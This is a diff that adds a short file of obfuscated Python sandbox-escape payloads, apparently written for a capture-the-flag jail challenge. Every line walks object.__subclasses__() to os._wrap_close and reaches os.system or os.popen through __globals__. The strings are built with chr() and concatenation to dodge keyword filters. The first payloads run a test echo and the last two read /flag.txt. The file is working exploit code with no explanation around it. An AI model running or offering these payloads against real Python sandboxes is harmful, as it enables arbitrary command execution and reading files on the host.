@@ -1,0 +1,5 @@
+[cls for cls in object.__subclasses__() if chr(111)+'s._wrap_cl'+chr(111)+'se' in str(cls)][0].__init__.__globals__['sys'].modules[chr(111)+chr(115)].system('echo aa')
+getattr([cls for cls in object.__subclasses__() if chr(111)+'s._wrap_cl'+chr(111)+'se' in str(cls)][0].__init__, 'globals')['sys'].modules[chr(111)+chr(115)].system('echo aa')
+getattr([x for x in object.__subclasses__() if chr(111)+'s._wrap_cl'+chr(111)+'se' in str(x)][0].__init__, '__global'+'s__')['sys'].modules[chr(111)+chr(115)].system('echo aa')
+getattr([x for x in object.__subclasses__() if chr(111)+'s._wrap_cl'+chr(111)+'se' in str(x)][0].__init__, '__global'+'s__')['sys'].modules[chr(111)+chr(115)].system('ca'+'t '+chr(47)+'flag'+chr(46)+'txt')
+getattr([x for x in object.__subclasses__() if chr(111)+'s._wrap_cl'+chr(111)+'se' in str(x)][0].__init__, '__global'+'s__')['sys'].modules[chr(111)+chr(115)].popen('ca'+'t '+chr(47)+'flag'+chr(46)+'txt').read()
